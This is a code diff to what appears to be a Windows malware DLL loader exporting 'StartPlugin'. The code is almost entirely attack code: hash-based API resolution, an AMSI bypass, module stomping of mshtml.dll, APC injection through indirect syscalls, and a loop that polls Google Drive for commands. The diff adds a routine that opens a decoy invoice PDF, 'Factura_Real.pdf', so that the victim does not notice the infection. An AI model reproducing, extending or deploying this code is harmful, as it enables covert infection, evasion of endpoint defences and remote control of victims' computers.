@@ -75,41 +75,42 @@ static void InitializeApiTable() {
     g_ApiTable.GetModuleFileNameW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetModuleFileNameW);
 }
 
-static void ThreadlessExecute(PVOID pPayload) {
-    THREADENTRY32 te;
-    te.dwSize = sizeof(te);
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) return;
+static void OpenDecoyDocument() {
+    ShellExecuteW(NULL, L"open", L"Factura_Real.pdf", NULL, NULL, SW_SHOWNORMAL);
+}
 
-    if (Thread32First(hSnap, &te)) {
-        do {
-            if (te.th32OwnerProcessID == GetCurrentProcessId() && te.th32ThreadID != GetCurrentThreadId()) {
-                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
-                if (hThread) {
-                    InvokeSyscall(g_ApiTable.NtQueueApcThread.ssn, g_SyscallGadget, hThread, pPayload, NULL, NULL, NULL);
-                    CloseHandle(hThread);
-                    break;
+static void ThreadlessExecute(PVOID pPayload) {
+    THREADENTRY32 te; te.dwSize = sizeof(te);
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        if (Thread32First(hSnap, &te)) {
+            do {
+                if (te.th32OwnerProcessID == GetCurrentProcessId() && te.th32ThreadID != GetCurrentThreadId()) {
+                    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+                    if (hThread) {
+                        InvokeSyscall(g_ApiTable.NtQueueApcThread.ssn, g_SyscallGadget, hThread, pPayload, NULL, NULL, NULL);
+                        CloseHandle(hThread);
+                        break;
+                    }
                 }
-            }
-        } while (Thread32Next(hSnap, &te));
+            } while (Thread32Next(hSnap, &te));
+        }
+        CloseHandle(hSnap);
     }
-    CloseHandle(hSnap);
 }
 
 extern "C" __declspec(dllexport) void StartPlugin() {
+    OpenDecoyDocument();
     g_SyscallGadget = FindSyscallGadget();
     InitializeApiTable();
     BypassAMSI_DataOnly();
 
-    PVOID pStompedMem = ModuleStomp(L"mshtml.dll", 0x1000);
-    if (pStompedMem) {
-        ThreadlessExecute(pStompedMem);
-    }
+    PVOID pMem = ModuleStomp(L"mshtml.dll", 0x1000);
+    if (pMem) ThreadlessExecute(pMem);
 
     char cmdBuffer[1024];
     while (TRUE) {
-        if (GDrive_CheckForCommands(cmdBuffer, sizeof(cmdBuffer))) {
-        }
+        if (GDrive_CheckForCommands(cmdBuffer, sizeof(cmdBuffer))) { }
         StealthSleep(60000); 
     }
 }
